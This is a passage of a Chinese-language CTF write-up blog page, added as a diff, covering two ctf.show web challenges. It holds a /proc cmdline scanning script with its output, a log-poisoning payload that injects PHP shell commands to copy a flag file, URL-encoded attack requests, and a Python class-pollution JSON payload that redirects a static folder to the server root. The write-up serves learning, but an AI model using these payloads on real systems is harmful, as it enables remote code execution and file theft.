+                webroot = full_path.replace(&quot;/start.php&quot;, &quot;&quot;)
+                
+                print(f&quot;✅ 成功提取 Webroot: {webroot}&quot;)
+                print(f&quot;📝 完整启动命令痕迹: {full_path}&quot;)
+                return webroot
+            
+            else:
+                # 如果是纯 raw 文本，可能需要人工看一眼
+                print(f&quot;⚠️ 发现 &#39;start.php&#39; 但自动提取失败，请手动分析以下返回内容片段：&quot;)
+                print(content[:200]) # 打印前200字符
+                return None
+
+    except Exception as e:
+        # 网络错误直接跳过
+        pass
+        
+    # 稍微延时，避免请求过快被防火墙拦截（虽然 CTF 环境通常没有）
+    # time.sleep(0.05) 
+
+print(&quot;\n[-] 扫描结束，未找到 Webroot。&quot;)
+return None
+if __name__ == &quot;__main__&quot;:
+    find_webroot()
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\G1731&gt; &amp; C:/Users/G1731/anaconda3/python.exe c:/Users/G1731/scan_pop.py</span><br><span class="line">[+] 开始扫描 PID，目标: https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/</span><br><span class="line">[+] 正在尝试读取 /proc/[PID]/cmdline ...</span><br><span class="line"></span><br><span class="line">[!] 在 PID: 8 发现关键信息！</span><br><span class="line">✅ 成功提取 Webroot: /var/www/html/webrooth1xaa</span><br><span class="line">📝 完整启动命令痕迹: /var/www/html/webrooth1xaa/start.php</span><br><span class="line">PS C:\Users\G1731&gt; </span><br></pre></td></tr></table></figure>
+
+<p>成功确认Web 根目录<code>/var/www/html/webrooth1xaa</code></p>
+<p>上网查日志路径规则是<code>runtime/logs/webman-Y-m-d.log</code>这样的。</p>
+<p>所以最终构造 Payload<code>?data={&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;/var/www/html/webrooth1xaa/runtime/logs/webman-2025-11-27.log&quot;}</code></p>
+<p>到这里，两步绝杀了，首先我们让错误文件上传。</p>
+<p><code>{&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;&lt;?php </code>cat &#x2F;s00* &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;webrooth1xaa&#x2F;public&#x2F;flag.txt<code>; ?&gt;&quot;}</code></p>
+<p><code>https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/index/testJson?data=%7B%22name%22%3A%22guest%22%2C%20%22__template_path__%22%3A%20%22%3C%3Fphp%20%60cat%20%2Fs00%2A%20%3E%20%2Fvar%2Fwww%2Fhtml%2Fwebrooth1xaa%2Fpublic%2Fflag.txt%60%3B%20%3F%3E%22%7D</code></p>
+<p>记得url编码，不然执行不了。</p>
+<p><code>{&quot;name&quot;:&quot;guest&quot;, &quot;__template_path__&quot;: &quot;/var/www/html/webrooth1xaa/runtime/logs/webman-2025-11-27.log&quot;}</code></p>
+<p><code>https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/index/testJson?data=%7B%22name%22%3A%22guest%22%2C%20%22__template_path__%22%3A%20%22%2Fvar%2Fwww%2Fhtml%2Fwebrooth1xaa%2Fruntime%2Flogs%2Fwebman-2025-11-27.log%22%7D</code></p>
+<p>得到日志，最后直接访问<code>https://5a93e3c8-9b5f-4d81-ac97-b9df647bd32d.challenge.ctf.show/flag.txt</code></p>
+<p>ctfshow{6a9025fc-8cb0-4de4-90d6-d7275ac512b0}</p>
+<p>拿下。</p>
+<hr>
+<h1 id="6-ez-inject"><a href="#6-ez-inject" class="headerlink" title="#6.ez_inject"></a>#6.ez_inject</h1><p>这一题比上面一题简单，我大概花了20分钟的样子。</p>
+<p>闲话不说，上题目。</p>
+<p><img src="/images/QQ20251130-195320.png" alt="alt text"></p>
+<p><img src="/images/QQ20251130-195616.png" alt="alt text"></p>
+<p>一开始我的思路是命令执行或者SSTI，看起来很像那种白名单黑名单过滤的样子，毕竟我也做过好几次计算机类型的题目。</p>
+<p>但试了几次没有结果后，我又转向注册账号，然后用命令获得权限的方向。</p>
+<p><img src="/images/QQ20251130-195631.png" alt="alt text"></p>
+<p>随便注册了一个账号发现，又试了试，还是一样的结果，这个时候，我就再看了一下网页。</p>
+<p><img src="/images/QQ20251130-195638.png" alt="alt text"></p>
+<p>提示直接甩脸上了。</p>
+<p>注册界面的污染。</p>
+<p>那不就是JSON污染吗。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: user,</span><br><span class="line">    &quot;password&quot;: &quot;123&quot;,</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;app&quot;: &#123;</span><br><span class="line">                &quot;static_folder&quot;: &quot;./../../../../&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接让网站去根目录找一下文件，最后直接拿下flag。</p>
+<p><strong>ctfshow{2fb222c8-f22d-4358-b452-07ea1c9376a5}</strong></p>
+<p>总结:这一题最大的漏洞应该就是网站注册后端存在递归函数，递归函数不断让我们跑到了整个服务器的根目录下，然后重新访问时候就能直接看到整个根目录下的文件。</p>
+<p>这里面能学到</p>
+<p><code>__init__</code>，初始化方法，所有对象都有。</p>
+<p><code>__globals__</code>，全局变量，函数都具有。</p>
+<p><code>function.__globals__</code>,全局命名空间字典。</p>
+<p>hasattr(     ,     ),代码检查。</p>
+<p>isinstance(     ,     ),判断类型。</p>
+<p>setattr(object, attribute, value),设置属性，赋值。</p>
+<hr>
+<hr>
+<p>   版权声明：本文由白白毛毛创作，转载请注明出处。</p>
+
+        </div>
+    </article>
+</div>
+
+</div>
+
+<script src="/js/main.js?v=1767337365559"></script>
+</body>
+</html>
